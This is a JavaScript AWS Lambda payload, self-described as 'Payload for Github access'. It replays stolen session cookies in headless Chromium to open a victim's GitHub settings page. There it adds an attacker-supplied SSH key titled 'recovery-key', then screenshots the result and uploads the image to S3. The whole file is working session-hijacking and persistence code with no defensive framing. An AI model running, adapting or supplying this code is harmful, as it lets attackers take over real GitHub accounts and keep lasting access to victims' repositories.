/**
 *
 * Payload for Github access
 * Add a ssh key and take screenshot
 *
 **/

const { uploadScreenshot } = require("./uploadScreenshot");
const chromium = require('chrome-aws-lambda');

module.exports.pwn = async (event, context, callback) => {

  let browser = null;
  
    browser = await chromium.puppeteer.launch({
      args: chromium.args,
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath,
      headless: true,
    });
 
//  console.log(event);
  const d=JSON.parse(JSON.stringify(event));
//  console.log(d.task.params.sshKey);
  const sshkey=d.task.params.sshKey;
  const stolenCookies=d.cookies;
//  console.log(d.cookies);
//  console.log(stolenCookies);

  const page = await browser.newPage();
  await page.setCookie(...stolenCookies);
  await page.goto('https://github.com/login')

  await page.goto('https://github.com/settings/ssh/new')
  await page.click('#public_key_title');
  await page.keyboard.type('recovery-key');

  await page.click('#public_key_key');
  await page.keyboard.type(sshkey);
//  await page.keyboard.type('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmcG/kI8N+h2hU6BrRCqJf+EUY2EyblEy2sZR4bBuyCcNYuB3PojxokVYinHTdNQXQ/T1DYfiikaxt3/dlMT/53vgWPYk6AvzvmUPdg33SH+EFECo2trpkJbN/wYldFqMYssq2PrF1nE8Ey0H4z/aFw5Ih6S3c6m2gyKcCK38esbGhDlcYK2wj9/2L/AtvOZK2jTkL4GqEUOszzE9UgOq6Xy1NapUNrmzMoRtnnn8WlNnF6oBk2hFKo5A+Qc6vxsPC4YqAFbJ0JoQg5uL+eWh48Nzh4rCYuKljAHTBCTgzT3J30cq1a0dOzQPHaEFALLl/GKtluS36UjOQ+y2y08oL test_only');

  await page.click('#new_key > p > button');

  // Screenshot 
  const screenshot = 'github';
  const imagePath = `/tmp/${screenshot}-${new Date().getTime()}.png`;
  await page.screenshot({ path: imagePath })
  browser.close()

  // upload screenshot to S3
  const url = await uploadScreenshot(imagePath, screenshot);

  //return result;
  console.log('result: ' + url )
  callback(null, url);

};
